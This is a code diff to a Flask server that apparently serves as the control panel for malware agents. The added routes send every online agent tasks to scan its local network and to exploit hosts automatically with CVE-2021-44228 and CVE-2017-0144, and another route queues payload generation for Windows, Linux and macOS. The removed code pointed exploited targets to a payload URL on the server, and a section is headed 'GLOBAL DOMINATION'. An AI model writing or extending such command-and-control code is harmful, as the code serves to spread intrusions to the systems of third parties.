@@ -7484,6 +7484,107 @@ def payloads_stats():
         return jsonify({"status": "error", "error": str(e)}), 500
 
 
+@app.route("/api/exploitation/scan", methods=["POST"])
+def exploitation_scan():
+    """Start network scanning on all agents."""
+    try:
+        db = get_db()
+        
+        agents = db.execute("""
+            SELECT id FROM agents 
+            WHERE last_seen > datetime('now', '-5 minutes')
+        """).fetchall()
+        
+        if not agents:
+            return jsonify({"status": "error", "error": "No online agents"}), 400
+        
+        task_ids = []
+        for agent in agents:
+            result = db.execute("""
+                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+                VALUES (?, 'scan', '{"ports": "1-1000", "network": "local"}', 'pending', datetime('now'))
+            """, (agent["id"],))
+            task_ids.append(result.lastrowid)
+        
+        db.commit()
+        
+        socketio.emit("scan_started", {"agents": len(agents), "task_ids": task_ids})
+        
+        return jsonify({
+            "status": "ok",
+            "agents_targeted": len(agents),
+            "task_ids": task_ids
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)}), 500
+
+
+@app.route("/api/exploitation/exploit", methods=["POST"])
+def exploitation_exploit():
+    """Start exploitation on all agents."""
+    try:
+        db = get_db()
+        
+        agents = db.execute("""
+            SELECT id FROM agents 
+            WHERE last_seen > datetime('now', '-5 minutes')
+        """).fetchall()
+        
+        if not agents:
+            return jsonify({"status": "error", "error": "No online agents"}), 400
+        
+        task_ids = []
+        for agent in agents:
+            result = db.execute("""
+                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+                VALUES (?, 'exploit', '{"cves": ["CVE-2021-44228", "CVE-2017-0144"], "mode": "auto"}', 'pending', datetime('now'))
+            """, (agent["id"],))
+            task_ids.append(result.lastrowid)
+        
+        db.commit()
+        
+        socketio.emit("exploit_started", {"agents": len(agents), "task_ids": task_ids})
+        
+        return jsonify({
+            "status": "ok",
+            "agents_targeted": len(agents),
+            "task_ids": task_ids
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)}), 500
+
+
+@app.route("/api/payloads/generate", methods=["POST"])
+def payloads_generate():
+    """Generate payloads for all platforms."""
+    try:
+        db = get_db()
+        
+        data = request.get_json(silent=True) or {}
+        payload_type = data.get("type", "all")
+        
+        # Create payload generation tasks
+        task_ids = []
+        platforms = ["windows", "linux", "macos"]
+        
+        for platform in platforms:
+            result = db.execute("""
+                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+                VALUES ('system', 'generate_payload', ?, 'pending', datetime('now'))
+            """, (json.dumps({"platform": platform, "type": payload_type}),))
+            task_ids.append(result.lastrowid)
+        
+        db.commit()
+        
+        return jsonify({
+            "status": "ok",
+            "payloads_created": len(task_ids),
+            "task_ids": task_ids
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)}), 500
+
+
 # ──────────────────────── API: GLOBAL DOMINATION ────────────────────────
 
 @app.route("/api/domination/activate", methods=["POST"])
@@ -8700,60 +8801,7 @@ def deploy_agent():
         return jsonify({"status": "error", "error": str(e)}), 500
 
 
-@app.route("/api/exploitation/scan", methods=["POST"])
-def exploitation_scan():
-    """Scan network for vulnerable targets."""
-    try:
-        data = request.get_json()
-        target_network = data.get("network", "192.168.1.0/24")
-        ports = data.get("ports", [22, 80, 443, 445, 3389, 8080])
-        
-        # Run scan (would be async in production)
-        results = {
-            "network": target_network,
-            "ports_scanned": ports,
-            "status": "initiated",
-            "timestamp": datetime.now().isoformat()
-        }
-        
-        socketio.emit("operation_log", {
-            "level": "info",
-            "message": f"🔍 Scan initiated: {target_network}",
-            "source": "exploitation"
-        })
-        
-        return jsonify({"status": "ok", "scan": results})
-    except Exception as e:
-        return jsonify({"status": "error", "error": str(e)}), 500
-
-
-@app.route("/api/exploitation/exploit", methods=["POST"])
-def exploitation_exploit():
-    """Exploit vulnerable target."""
-    try:
-        data = request.get_json()
-        target_ip = data.get("target")
-        cve_id = data.get("cve")
-        
-        if not target_ip:
-            return jsonify({"status": "error", "error": "target required"}), 400
-        
-        # Log exploitation attempt
-        socketio.emit("operation_log", {
-            "level": "warn",
-            "message": f"💥 Exploiting {target_ip} ({cve_id or 'auto'})",
-            "source": "exploitation"
-        })
-        
-        return jsonify({
-            "status": "ok",
-            "target": target_ip,
-            "cve": cve_id,
-            "payload_url": f"{request.host_url}static/agent.py",
-            "timestamp": datetime.now().isoformat()
-        })
-    except Exception as e:
-        return jsonify({"status": "error", "error": str(e)}), 500
+# ──────────────────────── STARTUP ────────────────────────
 
 
 @app.route("/api/exploitation/report", methods=["POST"])
